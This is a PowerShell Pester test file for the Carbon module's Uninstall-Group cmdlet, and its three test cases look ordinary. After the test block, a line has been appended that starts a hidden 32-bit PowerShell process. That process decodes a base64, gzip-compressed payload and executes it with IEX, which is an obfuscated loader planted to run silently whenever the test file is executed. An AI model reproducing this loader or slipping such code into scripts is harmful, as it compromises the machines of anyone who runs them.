











Set-StrictMode -Version 'Latest'

& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1')

describe Uninstall-Group {

    $groupName = 'TestUninstallGroup'
    $description = 'Used by Uninstall-Group.Tests.ps1'

    BeforeEach {
        Install-Group -Name $groupName -Description $description
        $Global:Error.Clear()
    }

    AfterEach {
        Uninstall-Group -Name $groupName
    }

    BeforeEach {
        $Global:Error.Clear()
    }

    It 'should remove the group' {
        Test-Group -Name $groupName | Should Be $true
        Uninstall-Group -Name $groupName
        Test-Group -Name $groupName | Should Be $false
    }

    It 'should remove nonexistent group without errors' {
        Uninstall-Group -Name 'fubarsnafu'
        $Global:Error.Count | Should Be 0
    }

    It 'should support WhatIf' {
        Uninstall-Group -Name $groupName -WhatIf
        Test-Group -Name $groupName | Should Be $true
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAAqSalgCA71W+2/aSBD+uZX6P1gVErZKMARakkiVbo15hUcAg3kdOi322mxYvI69Do9e//cbA27INalyd9JZidj1zOx++803O3YizxKUexK3alElXxiNpG8f3r/r4gCvJTkVltYPncIgI6XYYudMlXfvwJjC/qZdvjJ3fseUvkryDPm+zteYevObm3IUBMQTx3m2RgQKQ7JeMEpCWZH+lEZLEpCLu8U9sYT0TUr9ka0xvsDs5LYrY2tJpAvk2bGtxS0cw8saPqNCTv/+e1qZXeTn2cpDhFkop41dKMg6azOWVqTvSrzhYOcTOd2mVsBD7ojsiHqFy+zQC7FDOrDaI2kTseR2mFbgMPAXEBEFnnR+rHido5echmE34Bay7YCEEJRteI98ReSUFzGWkX6TZycQ/cgTdE3ALkjAfYMEj9QiYbaOPZuRPnHmcodskrO/NUg+DwKvrgiUDKTmdbRtbkeMHBdIKz/jTbKqwPMjs8DF9w/vP7x3EkGsrtqFyTUyBubiXBIwejc7jAkAlrs8pAf3r1IuI7VhTyx4sINpahBERJlLszgfs/lcSm2xyWsLi5WKzVLm9XXySVAccmVxa39l+tefx2CamZzacwg9ZS4lOrreL1Vi0+si1IlDPaLvPLymVqIz+aVcEIeRw+mziVsH8Mnpk4HYOmHExSKmNSPNfg6rrKn4EatFlNkkQBbkMwRUkGrlOZhjpuR0w2uTNdB2nKchKQ6omyTeJ0Xvkt3jOTilywyHYUbqRlBeVkYyCGbEzkjIC+nJhCLBD8P0E9x2xAS1cCiS5ebKGZWnLcvcC0UQWZBMOP7A8IlFMYvZyEh1ahNtZ1A32Tr9IhdlzBj1XFjpEXIBb2IODBFLJACUz+SgZA0iGmufkTX4Hkq+yrALBX6qj4O2sEvs9AtgE+0fhR4zk1ByBhXSbTAuMpJJAwGXR8zyubz+G6KzayTBVg7IKVdyUlwzbSfiWkj53pdxa+A3mrtaXCsJeweuAgE8VQO+1nBIvhQNEQCL8kf1jpYRPJOGx9qWtqJ5tKH5Rhv+h7TQ4HrJbt7e19VA3y4d1Agb7XpX79XrxcdbwywKo9IQzW5DtCvj+3sD1fvDiZg2UH1Ac6tJce/f0r3RQvZkq37Za/tNTtvu713bmeiO45Yco5//XKWtUbmn5S5xS69ErZG20XLFsEI39R4d9la3VbGYmAwPHdUd568x3baCezPP2/sGQrVlwdrfOmZt2bZ3k7p6PSquUAWhslcxqxpvTrQAdVUTuybfNF0N19wyKuMHSqa9YVXr9aoaGtbuH/Rr1YXYMV5qI/OSTv1xfwnzKkBoqrliwyZ7PukBSTWOsNsHH7d8aS0d8NE/Ie1Th4eXeKVxpIFPdfoAuCZ+tcvAPhhecmSyzhij1nRXVdX8pFtE9Rwd1VwUL4ldrYdR+KjvdTVv2twefe5MHNUcs5Kqlwe+5aiquqnrTWua317dla5aI2quORqqqvkxlghoJGWjsHSW79cu/zYOwiVmoAO4zpMyrfKgerqcu5zGEbL81LVXJPAIg0YHrTCROGKMW3GzOL/LoV8du8gcqnYIw8LliyNF+uGoPDWR5NXNzRQQQ82cKznbIp4rlpnctpDLQTvIbYs5OPnbT1vm/k5+tmQmbisH2v6+FzvspcRllQosbzpe9Bvh9n8g91TXS/ix30ju07tfWN9EeC5zJOOn189f/CPW/x0NI0wFuBtwOTFy7KO/ZOOkqrPvkaesgWKc0xN/I95F4qIDHyt/AcTlbfydCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
